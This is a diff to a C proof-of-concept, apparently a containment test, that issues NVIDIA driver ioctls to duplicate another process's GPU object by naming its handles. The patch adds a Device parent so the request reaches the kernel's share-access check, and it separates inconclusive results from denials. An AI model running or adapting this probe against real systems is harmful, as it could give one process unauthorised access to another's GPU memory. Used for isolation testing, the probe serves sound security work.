@@ -47,11 +47,25 @@ struct nvos55 {            /* NV_ESC_RM_DUP_OBJECT, 28B (575 SDK) */
 	uint32_t flags;
 	uint32_t status;
 };
+struct nv0080 {            /* NV0080_ALLOC_PARAMETERS — NV01_DEVICE_0 */
+	uint32_t device_id;
+	uint32_t h_client_share;
+	uint32_t h_target_client;
+	uint32_t h_target_device;
+	uint32_t flags;
+	uint32_t _pad0;
+	uint64_t va_space_size;
+	uint64_t va_start_internal;
+	uint64_t va_limit_internal;
+	uint32_t va_mode;
+	uint32_t _pad1;
+};
 
 #define NV_IOWR(nr, sz) (0xc0000000u | ((unsigned)(sz) << 16) | (0x46u << 8) | (nr))
 #define ESC_RM_ALLOC       0x2b
 #define ESC_RM_DUP_OBJECT  0x34
 #define NV01_ROOT          0x0
+#define NV01_DEVICE_0      0x80
 
 int main(int argc, char **argv)
 {
@@ -83,11 +97,31 @@ int main(int argc, char **argv)
 	my_client = a.h_object_new ? a.h_object_new : my_client;
 	fprintf(stderr, "poc: my client = 0x%x\n", my_client);
 
-	/* 2. Attempt to DUP the victim's object into our client purely by naming
+	/* 1b. Allocate our OWN Device under our client.  A Memory object's dup
+	 *     parent must be a Device, not a bare client — without this the dup
+	 *     fails at NV_ERR_INVALID_OBJECT_PARENT *before* the share-access check,
+	 *     which would mask whether containment (the access policy) actually
+	 *     holds.  With a real Device parent the dup reaches the access check. */
+	uint32_t my_device = my_client | 0x00000d00u;
+	struct nv0080 dp = { .device_id = 0 };
+	struct nvos21 ad = {
+		.h_root = my_client, .h_object_parent = my_client,
+		.h_object_new = my_device, .h_class = NV01_DEVICE_0,
+		.p_alloc_parms = (uint64_t)(uintptr_t)&dp, .status = 0,
+	};
+	if (ioctl(fd, NV_IOWR(ESC_RM_ALLOC, sizeof ad), &ad) < 0 || ad.status != 0) {
+		fprintf(stderr, "poc: device alloc failed errno=%d status=0x%x "
+			"(can't form a valid dup parent)\n", errno, ad.status);
+		return 5;
+	}
+	my_device = ad.h_object_new ? ad.h_object_new : my_device;
+	fprintf(stderr, "poc: my device = 0x%x\n", my_device);
+
+	/* 2. Attempt to DUP the victim's object UNDER OUR DEVICE purely by naming
 	 *    its (hClientSrc, hObjectSrc). No prior relationship to the victim. */
 	struct nvos55 d = {
 		.h_client = my_client,
-		.h_parent = my_client,            /* parent the dup under our client */
+		.h_parent = my_device,            /* valid Device parent in our client */
 		.h_object = (my_client & 0xffff0000u) | 0x0abc, /* new handle in our space */
 		.h_client_src = h_client_src,
 		.h_src_object = h_src_object,
@@ -102,7 +136,17 @@ int main(int argc, char **argv)
 		       "(hole OPEN)\n", h_src_object);
 		return 0;
 	}
-	printf("DUP DENIED — kernel refused cross-process dup (status=0x%x) "
-	       "(containment holds)\n", d.status);
+	/* 0x1e = NV_ERR_INVALID_OBJECT_PARENT: the dup never reached the access
+	 * check, so this run does NOT prove containment — fix the parent setup. */
+	if (d.status == 0x1e) {
+		printf("INCONCLUSIVE — dup rejected at parent validation (0x1e) before "
+		       "the access check; not a containment proof\n");
+		return 2;
+	}
+	/* Reaching here means a real cross-client access denial (e.g.
+	 * 0x1b INSUFFICIENT_PERMISSIONS / 0x23 INVALID_CLIENT / 0x56 NOT_SUPPORTED)
+	 * — the share policy refused a host neighbour. Containment holds. */
+	printf("DUP DENIED — kernel share policy refused cross-process dup "
+	       "(status=0x%x) — containment holds\n", d.status);
 	return 1;
 }
